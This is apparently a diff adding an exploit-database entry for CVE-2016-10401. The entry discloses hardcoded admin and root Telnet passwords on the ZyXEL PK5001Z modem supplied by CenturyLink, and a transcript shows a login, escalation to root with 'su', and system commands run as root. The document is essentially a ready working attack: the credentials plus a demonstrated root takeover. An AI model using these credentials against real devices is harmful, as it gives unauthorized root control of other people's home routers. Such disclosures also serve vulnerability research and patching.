@@ -1,0 +1,41 @@
+# Exploit Title: ZyXEL PK5001Z Modem - CenturyLink Hardcoded admin and root Telnet Password.
+# Google Dork: n/a
+# Date: 2017-10-31
+# Exploit Author: Matthew Sheimo
+# Vendor Homepage: https://www.zyxel.com/
+# Software Link: n/a
+# Version: PK5001Z 2.6.20.19
+# Tested on: Linux
+# About: ZyXEL PK5001Z Modem is used by Century Link a global communications and IT services company focused on connecting its customers to the power of the digital world. 
+# Linked CVE's: CVE-2016-10401
+ 
+ 
+Hardcoded password for ZyXEL PK5001Z Modem, login with the following credentials via Telnet
+ 
+username: admin
+password: CenturyL1nk
+ 
+Escalate to root with 'su' and this password.
+
+password: zyad5001
+
+
+[root:/]# telnet 192.168.0.1
+Trying 192.168.0.1...
+Connected to 192.168.0.1.
+Escape character is '^]'.
+
+PK5001Z login: admin
+Password: CenturyL1nk
+$ whoami
+admin_404A03Tel
+$ su
+Password: zyad5001
+# whoami
+root
+# uname -a
+Linux PK5001Z 2.6.20.19 #54 Wed Oct 14 11:17:48 CST 2015 mips unknown
+# cat /etc/zyfwinfo
+Vendor Name:                      ZyXEL Communications Corp.
+
+
